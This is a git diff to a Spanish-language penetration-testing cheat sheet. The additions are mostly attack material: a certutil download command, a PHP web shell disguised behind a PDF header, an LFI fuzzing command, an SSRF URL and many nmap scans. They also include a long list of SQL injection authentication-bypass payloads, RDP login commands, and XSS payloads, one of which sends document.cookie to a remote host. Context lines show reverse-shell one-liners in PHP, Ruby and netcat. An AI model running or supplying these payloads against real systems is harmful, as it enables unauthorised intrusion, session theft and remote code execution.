@@ -38,6 +38,7 @@ TRANSFERENCIA DE ARCHIVOS
 sudo python -m http.server 80
 sudo python -m SimpleHTTPServer 80
 sudo python smbserver.py [como se llamará el recurso a compartir] [nombre del recurso a compartir] ej smbserver.py compartida /home/kali/Downloads
+certutil -urlcache -split -f "http://<LHOST>/<FILE>" <FILE>
 
      Target Linux: 
          wget http://[IP]/recurso
@@ -54,14 +55,21 @@ TRATAMIENTO TTY
 ...............
 
 LINUX
-   script /dev/null -c bash // python -c "import pty;pty.spawn('/bin/bash')"
+   script /dev/null -c bash // python -c 'import pty;pty.spawn("/bin/bash")'
    ctrl+z
-   stty raw-echo;fg
+   stty raw-echo
+   fg
    reset
    xterm
    export TERM=xterm
    export SHELL=bash
    stty rows 52 columns 180
+
+oneliner: stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
+
+other....
+   script -q /dev/null -c bash
+   /usr/bin/script -qc /bin/bash /dev/null
    
 WINDOWS
    https://github.com/antonioCoco/ConPtyShell
@@ -77,6 +85,8 @@ wfuzz -c -t 400 --hc=404 -z range,0-100 http://IP/note.php?note=FUZZ --> probar 
 nmap --script http-enum -p [PUERTO] [IP]
 
 gobuster dir --url http://IP --wordlist /usr/share/wordlists/dirb/big.txt
+
+ffuf -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -u http://<RHOST>/admin../admin_staging/index.php?page=FUZZ -fs 15349 --> Searching for LFI
 
 dirb http://IP /path/to/wordlist
 
@@ -114,6 +124,12 @@ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOC
 // PHP
 php -r '$sock=fsockopen("8.8.8.8",8080);exec("/bin/sh -i <&3 >&3 2>&3");'
 
+     pdf php inclusion
+          %PDF-1.4
+          <?php
+              system($_GET["cmd"]);
+          ?>
+
 // Ruby
 ruby -rsocket -e'f=TCPSocket.open("8.8.8.8",8080).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
 
@@ -122,6 +138,21 @@ nc -e /bin/sh 8.8.8.8 8080
 
 // PowerShell
 https://www.hackingarticles.in/powershell-for-pentester-windows-reverse-shell/
+
+
+NMAP
+....
+
+sudo nmap -A -T4 -sC -sV -p- <RHOST>
+sudo nmap -sV -sU <RHOST>
+sudo nmap -A -T4 -sC -sV --script vuln <RHOST>
+sudo nmap -A -T4 -p- -sS -sV -oN initial --script discovery <RHOST>
+sudo nmap -sC -sV -p- --scan-delay 5s <RHOST>
+sudo nmap $TARGET -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm='test' <RHOST>
+ls -lh /usr/share/nmap/scripts/*ssh*
+locate -r '\.nse$' | xargs grep categories | grep categories | grep 'default\|version\|safe' | grep smb
+
+     https://nmap.org/man/es/index.html
 
 
 WEB SHELL
@@ -171,6 +202,12 @@ BANNER GRABING
 nc -nv  <IP> <port>
 
 
+SSRF
+.....
+
+https://<RHOST>/item/2?server=server.<RHOST>/file?id=9&x=
+
+
 SQLMAP
 .......
 
@@ -189,6 +226,68 @@ sqlmap -u http://[IP]/?id=1 -D database_name -T table_name --columns
 sqlmap -u http://[IP]/?id=1 -D database_name -T table_name --dump-all
 
 More....https://hackersonlineclub.com/sql-injection-cheatsheet/
+
+
+MANUAL SQLi
+............
+
+admin' or '1'='1
+' or '1'='1
+" or "1"="1
+" or "1"="1"--
+" or "1"="1"/*
+" or "1"="1"#
+" or 1=1
+" or 1=1-
+") or "1"="1
+") or "1"="1"--
+") or "1"="1"/*
+") or "1"="1"#
+") or ("1"="1
+") or ("1"="1"--
+") or ("1"="1"/*
+") or ("1"="1"#
+) or '1`='1-
+
+     authentication bypass
+
+          '-'
+          ' '
+          '&'
+          '^'
+          '*'
+          ' or 1=1 limit 1 -- -+
+          '="or'
+          ' or ''-'
+          ' or '' '
+          ' or ''&'
+          ' or ''^'
+          ' or ''*'
+          or true--
+          " or true--
+          ' or true--
+          ") or true--
+          ') or true--
+          ' or 'x'='x
+          ') or ('x')=('x
+          ')) or (('x'))=(('x
+          or 2 like 2
+          or 1=1/*
+          admin' --
+          admin' -- -
+          admin' #
+          admin'/*
+          admin') or ('2' LIKE '2
+          admin') or ('2' LIKE '2'#
+          admin') or ('2' LIKE '2'/*
+          admin' or '1'='1
+          admin' or '1'='1'--
+          admin' or '1'='1'#
+          admin' or '1'='1'/*
+          admin'or 1=1 or ''='
+          admin' or 1=1
+          1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055
+          1234 " AND 1=0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed055
 
 
 CRACKING PASSWORDS/LOGIN WEB
@@ -336,6 +435,9 @@ RDP
 
 xfreerdp /v:[IP] -sec-nla /u:"" -- Recon
 xfreerdp /u:[USER] /p:[PASS] /v:[IP] /cert-ignore -- Para conectarse por RDP a un equipo
+xfreerdp /v:<RHOST> /u:<USERNAME> /p:<PASSWORD> /dynamic-resolution +clipboard
+
+rdesktop <RHOST>
 
 ncrack -vv --user user -P wordlist.txt [IP]:3389 -- Try cracking rdp login
 
@@ -358,6 +460,14 @@ https://www.hackplayers.com/2022/03/top10-de-ataques-al-directorio-activo.html
 
 XSS
 ....
+<sCrIpt>alert(1)</ScRipt>
+<script>alert('XSS');</script>
+<script>alert(document.cookies)</script>
+<script>document.querySelector('#foobar-title').textContent = '<TEXT>'</script>
+<script>fetch('https://<RHOST>/steal?cookie=' + btoa(document.cookie));</script>
+<script>user.changeEmail('user@domain');</script>
+<iframe src=file:///etc/passwd height=1000px width=1000px></iframe>
+<img src='http://<RHOST>'/>
 
 <script>alert('Found')</script>
 "><script>alert(Found)</script>">
